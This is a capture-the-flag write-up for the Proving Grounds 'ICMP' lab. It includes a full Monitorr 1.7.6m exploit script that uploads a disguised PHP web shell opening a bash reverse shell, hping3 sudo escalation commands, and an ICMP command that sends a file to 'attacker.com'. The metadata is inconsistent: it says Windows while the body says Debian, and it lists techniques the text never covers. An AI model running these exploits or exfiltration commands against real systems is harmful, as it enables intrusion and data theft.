---
title: "PG Play: ICMP"
created: "2023-07-15"
updated: "2026-04-11"
type: ctf-writeup
platform: Proving Grounds Play
machine: "ICMP"
os: Windows
status: rooted
tags:
  - - proving-grounds
  - pg-play
  - windows
  - ctf
  - oscp
  - gtfobins-exploit
  - local-file-inclusion-lfi
  - reverse-shell
  - file-upload
  - ssh-key-theft
related:
  - "[[GTFObins-SUID-Quick-Reference]]"
  - "[[LFI-to-RCE-Log-Poisoning-Pattern]]"
  - "[[Reverse-Shell-Reference]]"
  - "[[File-Upload-to-RCE-Patterns]]"
  - "[[FTP-Exploitation-Techniques]]"
  - "[[Searchsploit-and-CVE-Workflow]]"
  - "[[Windows-PrivEsc-Decision-Tree]]"
  - "[[Nmap-Enumeration-Methodology]]"
---

# PG Play: ICMP

> **Platform:** Proving Grounds Play | **OS:** Windows | **Date:** 2023-07-15

---

## Quick Summary

**Open Ports:**
- (Run Nmap to discover)

**Key Techniques:**
- GTFObins Exploit
- Local File Inclusion (LFI)
- Reverse Shell
- File Upload
- SSH Key Theft
- Searchsploit / Exploit-DB
- ICMP

**Privilege Escalation Path:**
- sudo -l abuse

---

## Full Walkthrough

Proving grounds Play - ICMP CTF writeup.


[*(screenshot)*](https://youtu.be/6fyL_fFyV4c)

## NMAP


## PORT 80 Tech Stack

- Operating System: Debian
- Web Technology: Apache, PHP (view-page-source)

## Monitorr



### Exploit Code

```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-

# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
# Date: September 12, 2020
# Exploit Author: Lyhin's Lab
# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
# Software Link: https://github.com/Monitorr/Monitorr
# Version: 1.7.6m
# Tested on: Ubuntu 19

import requests
import os
import sys

if len (sys.argv) != 4:
	print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
else:
    url = sys.argv[1] + "/assets/php/upload.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", "Origin": sys.argv[1], "Connection": "close", "Referer": sys.argv[1]}

    data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"she_ll.php\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+sys.argv[2] +"/" + sys.argv[3] + " 0>&1'\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"

    requests.post(url, headers=headers, data=data)

    print ("A shell script should be uploaded. Now we try to execute it")
    url = sys.argv[1] + "/assets/data/usrimg/she_ll.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    requests.get(url, headers=headers)
```
### Obtaining Reverse Shell


**Obtained local flag**


# Privilege Escalation
### Obtain user

The permission is denied to access the `devel` folder as current user is not a system user. But as the tip found in the reminder file below.


The php file `crypt.php` inside the `devel` folder disclosed the SSH password for the user `fox`.

```php
<?php
echo crypt('BUHNIJMONIBUVCYTTYVGBUHJNI','da');
?>
```
**User access obtained.**


## Root Privilege Escalation

Check the current user sudo permissions.


Search for exploit in GTFO bins for `hping3`

### Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
```sh
sudo hping3
/bin/sh
```

The file is continuously sent, adjust the `--count` parameter or kill the sender when done. Receive on the attacker box with:
```sh
sudo hping3 --icmp --listen xxx --dump
```

RHOST=attacker.com
LFILE=file_to_read
```sh
sudo hping3 "$RHOST" --icmp --data 500 --sign xxx --file "$LFILE"
```

## Transfering SSH key locally to obtain root access through hping3

### ICMP Listener


### ICMP: Data send


### ICMP: Data Receive


## SSH Root User

SSH to the root user using the obtained root SSH key.


**Root user access and proof.txt obtained**

---

## Technique Links

- [[GTFObins-SUID-Quick-Reference]]
- [[LFI-to-RCE-Log-Poisoning-Pattern]]
- [[Reverse-Shell-Reference]]
- [[File-Upload-to-RCE-Patterns]]
- [[FTP-Exploitation-Techniques]]
- [[Searchsploit-and-CVE-Workflow]]
- [[Windows-PrivEsc-Decision-Tree]]
- [[Nmap-Enumeration-Methodology]]
- [[Proving-Grounds-Master-Index]]
